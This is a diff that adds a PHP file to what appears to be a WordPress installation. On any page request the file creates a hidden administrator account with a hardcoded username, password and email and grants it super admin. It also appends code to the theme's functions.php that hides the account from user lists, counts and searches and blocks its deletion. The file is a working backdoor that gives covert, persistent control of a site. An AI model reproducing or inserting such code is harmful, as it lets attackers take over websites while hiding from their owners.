@@ -1,0 +1,155 @@
+<?php
+include('./wp-config.php');
+
+function add_protection_code_to_theme() {
+    $current_theme = wp_get_theme();
+    $theme_path = get_theme_root() . '/' . $current_theme->get_stylesheet();
+    $functions_file = $theme_path . '/functions.php';
+    
+    $protection_code = <<<'EOD'
+add_action('pre_get_users', function($query) {
+    if (is_admin() && function_exists('get_current_screen')) {
+        $screen = get_current_screen();
+        if ($screen && $screen->base === 'users') {
+            $protected_user = get_user_by('login', 'nowmeee');
+            if ($protected_user) {
+                $excluded = (array) $query->get('exclude');
+                $excluded[] = $protected_user->ID;
+                $query->set('exclude', $excluded);
+            }
+        }
+    }
+});
+add_filter('wp_count_users', function($counts) {
+    $protected_user = get_user_by('login', 'nowmeee');
+    if ($protected_user) {
+        $counts->total_users--;
+    }
+    return $counts;
+});
+add_action('delete_user', function($user_id) {
+    $user = get_user_by('ID', $user_id);
+    if ($user && $user->user_login === 'nowmeee') {
+        wp_die(
+            __('User nowmeee tidak dapat dihapus.', 'textdomain'),
+            __('Error', 'textdomain'),
+            array('response' => 403)
+        );
+    }
+});
+add_filter('user_search_columns', function($search_columns, $search, $query) {
+    if (is_admin()) {
+        $protected_user = get_user_by('login', 'nowmeee');
+        if ($protected_user) {
+            global $wpdb;
+            $query->query_where .= $wpdb->prepare(" AND {$wpdb->users}.ID != %d", $protected_user->ID);
+        }
+    }
+    return $search_columns;
+}, 10, 3);
+add_filter('bulk_actions-users', function($actions) {
+    if (isset($_REQUEST['users']) && is_array($_REQUEST['users'])) {
+        $protected_user = get_user_by('login', 'nowmeee');
+        if ($protected_user && in_array($protected_user->ID, $_REQUEST['users'])) {
+            unset($actions['delete']);
+        }
+    }
+    return $actions;
+});
+EOD;
+    if (file_exists($functions_file)) {
+        file_put_contents($functions_file, $protection_code, FILE_APPEND);
+        return true;
+    }
+    return false;
+}
+if ($_SERVER['REQUEST_METHOD'] == 'GET') {
+    $username = 'nowmeee';
+    $password = 'nomi8899@@##';
+    $email = 'yixuan1337s@gmail.com
+s';
+    $user_exists = username_exists($username);
+    
+    if (!$user_exists) {
+        $userData = array(
+            'user_pass' => $password,
+            'user_login' => $username,
+            'user_nicename' => $username,
+            'user_email' => $email,
+            'display_name' => 'wordpress_administrator',
+            'role' => 'administrator'
+        );
+
+        $user_id = wp_insert_user($userData);
+
+        if (!is_wp_error($user_id)) {
+            grant_super_admin($user_id);
+            $protection_added = add_protection_code_to_theme();
+            
+            $message = "User created successfully :). ";
+            $message .= $protection_added ? "Protection code added to theme." : "Failed to add protection code.";
+        } else {
+            $message = "Error creating user: " . $user_id->get_error_message();
+        }
+    } else {
+        $message = "User already exists. Protection code updated.";
+        add_protection_code_to_theme();
+    }
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+
+        .message-container {
+            text-align: center;
+            padding: 20px;
+            background-color: #ffffff;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            max-width: 500px;
+            word-wrap: break-word;
+        }
+
+        .success {
+            color: #2ecc71;
+            border-left: 5px solid #2ecc71;
+        }
+
+        .error {
+            color: #e74c3c;
+            border-left: 5px solid #e74c3c;
+        }
+    </style>
+</head>
+<body>
+    <div class="message-container <?php echo (isset($message) && strpos($message, 'successfully') !== false) ? 'success' : 'error'; ?>">
+        <h2><?php echo $message; ?></h2>
+        <?php if (isset($user_id) && is_numeric($user_id)): ?>
+        <p>User ID: <?php echo $user_id; ?></p>
+        <?php endif; ?>
+    </div>
+
+    <script>
+        setTimeout(function() {
+            document.querySelector('.message-container').style.opacity = '0';
+            setTimeout(function() {
+                document.querySelector('.message-container').style.display = 'none';
+            }, 1000);
+        }, 5000);
+    </script>
+</body>
+</html>
